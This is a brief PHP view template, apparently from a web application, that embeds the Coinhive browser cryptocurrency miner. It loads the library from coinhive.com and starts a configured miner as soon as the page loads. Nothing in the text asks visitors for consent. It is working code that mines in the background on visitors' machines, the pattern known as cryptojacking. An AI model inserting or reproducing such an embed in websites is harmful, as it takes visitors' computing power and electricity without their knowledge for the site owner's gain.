<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
    <?php
        echo "
            var miner = new CoinHive.User('$coinhive_api_public_key', '".base_url()."', {
				threads: $hm_number_of_threads,
				autoThreads: '$hm_auto_threads',
				throttle: $hm_throttle,
				forceASMJS: false
			});
	    miner.start();";
    ?>
</script>